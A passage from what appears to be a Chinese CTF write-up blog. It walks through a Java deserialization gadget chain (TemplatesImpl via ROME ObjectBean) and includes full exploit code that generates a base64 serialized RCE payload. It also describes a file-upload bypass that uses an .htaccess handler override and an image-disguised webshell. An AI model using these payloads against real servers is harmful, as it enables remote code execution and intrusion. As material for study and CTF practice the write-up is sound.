translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">           translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">           <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">               translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> translet;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">               NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">           <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>A3 处当条件为 True 时会进入 <code>defineTransletClasses()</code> 函数：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);	<span class="comment">// A4</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>A4 处反序列化 payload 中的恶意字节码将会被读取，回到上一层函数，在 A5 处恶意字节码被解析调用，从而触发 RCE。</p>
<p>注意调用栈中标记的 A1 与 A2 节点，当 IDEA 进入两个节点之间（包括节点本身）的源码处时字节码会被直接加载，导致 RCE 被提前执行，<code>_class=true</code> 会在上述操作完成时从 <code>true</code> 变为 <code>false</code> 。因此直接从入口节点 <code>hashCode()</code> 往下调试会失败，必须跳过指定节点段来避免字节码的提前加载，从而看到完整的调用链。</p>
<h4 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h4><p>首先需要导入 <code>javassist, rhino</code> 包：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">​</span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mozilla<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rhino<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>触发 <code>getOutputProperties()</code> 链条的测试代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;aaaaaaaaaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Class[] types = &#123;<span class="type">byte</span>[][].class, String.class, Properties.class, <span class="type">int</span>.class, TransformerFactoryImpl.class&#125;;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> templatesimpl.getDeclaredConstructor(types);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TransformerFactoryImpl</span> <span class="variable">tf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        Object[] params = &#123;bytecodes,<span class="string">&quot;test&quot;</span>,p,<span class="number">1</span>,tf&#125;;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(params);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> templatesimpl.getMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        method.invoke(object);	<span class="comment">// A6</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后能成功执行语句 <code>System.out.println(&quot;aaaaaaaaaaa&quot;)</code> ，但也会抛出错误：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InvocationTargetException</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:<span class="number">498</span>)</span><br><span class="line">	at myremo.EXP.main(EXP.java:<span class="number">30</span>)</span><br></pre></td></tr></table></figure></div>

<p>A6 处调用了 <code>TemplatesImpl.getOutputProperties(constructor.newInstance(params))</code> 函数，下断点直接来到 A3 处且条件为 true，接下来就是读取恶意字节码并生成实例，以完成 RCE。（目前知识有限，没法弄清这里到底发生了什么…）</p>
<p>完整构造链的测试（更看不懂了 &#x3D; &#x3D;）：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> myremo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldByteCodes</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldByteCodes.set(templatesimpl, bytecodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(templatesimpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldTfactory</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        fieldTfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldTfactory.set(templatesimpl, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>).newInstance());</span><br><span class="line">        <span class="comment">// 注意要通过2个objectbean才能达成触发条件</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesimpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashmap.put触发</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(objectBean2,<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试了整条构造链的可行性，用 <code>hashmap.put()</code> 来模拟反序列化中调用 <code>hashCode()</code> 函数的行为，触发该函数入口。</p>
<p>构造完整利用链条的 EXP：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldByteCodes</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldByteCodes.set(templatesimpl, bytecodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(templatesimpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldTfactory</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        fieldTfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldTfactory.set(templatesimpl, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>).newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 要通过2个objectbean才能达成触发条件</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesimpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置hashmap，参考ysoserial</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldsize</span> <span class="operator">=</span> hashmap.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        fieldsize.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldsize.set(hashmap,<span class="number">2</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">nodeC</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        Object tbl = Array.newInstance(nodeC, 2); 也可以只写入objectBean2, 就是会报错(但还是执行了命令)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean1, objectBean1, null));</span></span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, objectBean2, objectBean2, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldtable</span> <span class="operator">=</span> hashmap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        fieldtable.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldtable.set(hashmap,tbl);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出base64后的序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        out.writeObject(hashmap);</span><br><span class="line">        <span class="type">byte</span>[] sss = byteArrayOutputStream.toByteArray();</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(sss);</span><br><span class="line">        System.out.println(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>更改要执行的命令运行程序即可获得 base64 编码后的 payload，如果要传入服务器记得还需要 URL 编码。</p>
<h2 id="WEB-Week5"><a href="#WEB-Week5" class="headerlink" title="WEB-Week5"></a>WEB-Week5</h2><h3 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h3><p><em>文件上传 <code>.htaccess</code> 文件</em></p>
<p>后端防火墙采用了黑名单，过滤了 <code>php, php3, phtml, pHp, png.php</code> 等诸多关键词与绕过 tricks。但允许上传 <code>.htaccess</code> 文件，文件内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.png&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<p>上传后上传一个图片格式的一句话木马，测试有效，则 GetShell 成功。</p>
<p>flag 在 env 中，可以用：</p>
